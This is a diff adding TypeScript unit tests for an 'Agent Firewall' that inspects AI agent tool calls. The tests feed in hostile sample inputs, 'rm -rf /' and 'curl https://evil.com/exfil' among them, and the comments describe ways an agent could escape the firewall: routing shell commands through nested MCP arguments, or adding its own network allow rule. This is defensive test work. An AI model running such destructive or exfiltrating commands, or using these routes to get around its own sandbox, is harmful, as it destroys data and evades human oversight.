@@ -5,11 +5,13 @@ import {
   clearThreadCallCount,
   enforceBudget,
   getThreadCallCount,
+  getThreadCallCountSize,
   hostGlobToRegExp,
   incrementThreadCallCount,
   inspectToolCall,
   isCommandTool,
   isNetworkTool,
+  pruneStaleThreadCallCounts,
   resetThreadCallCounts,
 } from "../engine";
 import type { FirewallConfig } from "../types";
@@ -225,6 +227,128 @@ describe("Agent Firewall engine", () => {
   });
 
   // --------------------------------------------------------------------------
+  // inspectToolCall — escape/bypass coverage (review blockers)
+  // --------------------------------------------------------------------------
+
+  describe("inspectToolCall escape coverage", () => {
+    it("denies a command routed through call_mcp_tool's nested arguments", () => {
+      // Review blocker: an agent could defeat FIREWALL_COMMAND_DENY by routing
+      // `rm -rf /` through any MCP server's shell tool. The firewall must
+      // recurse into the nested payload.
+      const config = makeConfig({ commandDeny: [/\brm\s+-rf\b/] });
+      const result = inspectToolCall(
+        "call_mcp_tool",
+        { server: "x", name: "shell", arguments: { command: "rm -rf /" } },
+        config,
+      );
+      expect(result.block).toBe(true);
+      expect(result.rule).toBe("command_denied");
+    });
+
+    it("denies a command routed through call_mcp_tool using the toolArgs key", () => {
+      // The MCP tool's schema uses `toolArgs`; both nested keys must be covered.
+      const config = makeConfig({ commandDeny: [/\brm\s+-rf\b/] });
+      const result = inspectToolCall(
+        "call_mcp_tool",
+        { server: "x", name: "shell", toolArgs: { command: "rm -rf /" } },
+        config,
+      );
+      expect(result.block).toBe(true);
+    });
+
+    it("denies a network target routed through call_mcp_tool's nested arguments", () => {
+      const config = makeConfig({ networkAllow: ["github.com"] });
+      const result = inspectToolCall(
+        "call_mcp_tool",
+        {
+          server: "x",
+          name: "fetch",
+          arguments: { url: "https://evil.example.com/exfil" },
+        },
+        config,
+      );
+      expect(result.block).toBe(true);
+      expect(result.rule).toBe("network_denied");
+    });
+
+    it("denies a network target routed through read_mcp_resource's uri", () => {
+      const config = makeConfig({ networkAllow: ["github.com"] });
+      const result = inspectToolCall(
+        "read_mcp_resource",
+        { server: "x", uri: "https://evil.example.com/secret" },
+        config,
+      );
+      expect(result.block).toBe(true);
+      expect(result.rule).toBe("network_denied");
+    });
+
+    it("denies sandbox_network when it adds an allow rule for a non-allowlisted host", () => {
+      // Review blocker: the agent can self-modify egress policy to any host
+      // and the firewall never sees it. sandbox_network must be treated as a
+      // network tool whose rules[].target is checked against the allowlist.
+      const config = makeConfig({ networkAllow: ["github.com"] });
+      const result = inspectToolCall(
+        "sandbox_network",
+        { rules: [{ action: "allow", target: "evil.com" }] },
+        config,
+      );
+      expect(result.block).toBe(true);
+      expect(result.rule).toBe("network_denied");
+      expect(result.reason).toContain("evil.com");
+    });
+
+    it("allows sandbox_network when adding an allow rule for an allowlisted host", () => {
+      const config = makeConfig({ networkAllow: ["github.com"] });
+      const result = inspectToolCall(
+        "sandbox_network",
+        { rules: [{ action: "allow", target: "github.com" }] },
+        config,
+      );
+      expect(result.block).toBe(false);
+    });
+
+    it("ignores sandbox_network deny rules (they narrow egress, not broaden it)", () => {
+      const config = makeConfig({ networkAllow: ["github.com"] });
+      const result = inspectToolCall(
+        "sandbox_network",
+        { rules: [{ action: "deny", target: "evil.com" }] },
+        config,
+      );
+      expect(result.block).toBe(false);
+    });
+
+    it("composes command + network rules: a command-allowed fetcher still respects egress", () => {
+      // Review blocker: command-allowlist defeating network-allowlist. With
+      // commandAllow:[/^curl/] and networkAllow:['github.com'], `curl
+      // https://evil.com/exfil` must be blocked by the network layer.
+      const config = makeConfig({
+        commandAllow: [/^curl/],
+        networkAllow: ["github.com"],
+      });
+      const result = inspectToolCall(
+        "sandbox_shell",
+        { command: "curl https://evil.com/exfil" },
+        config,
+      );
+      expect(result.block).toBe(true);
+      expect(result.rule).toBe("network_denied");
+    });
+
+    it("composes command + network rules: allowed command + allowlisted host passes", () => {
+      const config = makeConfig({
+        commandAllow: [/^curl/],
+        networkAllow: ["github.com"],
+      });
+      const result = inspectToolCall(
+        "sandbox_shell",
+        { command: "curl https://github.com/api" },
+        config,
+      );
+      expect(result.block).toBe(false);
+    });
+  });
+
+  // --------------------------------------------------------------------------
   // Per-thread call counter
   // --------------------------------------------------------------------------
 
@@ -259,6 +383,30 @@ describe("Agent Firewall engine", () => {
       resetThreadCallCounts();
       expect(getThreadCallCount("t1")).toBe(0);
       expect(getThreadCallCount("t2")).toBe(0);
+    });
+
+    it("pruneStaleThreadCallCounts evicts entries older than the TTL", () => {
+      // Review blocker: unbounded module-level Map with no eviction. We verify
+      // the TTL-based eviction drops stale threads by inserting entries, then
+      // pruning with a simulated `now` past the TTL.
+      const t0 = Date.now();
+      incrementThreadCallCount("stale1");
+      incrementThreadCallCount("stale2");
+      expect(getThreadCallCountSize()).toBe(2);
+      // Prune with now = t0 + 61min and a 60min TTL -> both stale entries drop.
+      pruneStaleThreadCallCounts(t0 + 61 * 60 * 1000, 60 * 60 * 1000);
+      expect(getThreadCallCountSize()).toBe(0);
+      expect(getThreadCallCount("stale1")).toBe(0);
+      expect(getThreadCallCount("stale2")).toBe(0);
+    });
+
+    it("pruneStaleThreadCallCounts retains fresh entries", () => {
+      const t0 = Date.now();
+      incrementThreadCallCount("fresh");
+      // Prune at t0 with a 60min TTL -> entry is fresh, retained.
+      pruneStaleThreadCallCounts(t0, 60 * 60 * 1000);
+      expect(getThreadCallCountSize()).toBe(1);
+      expect(getThreadCallCount("fresh")).toBe(1);
     });
   });
 
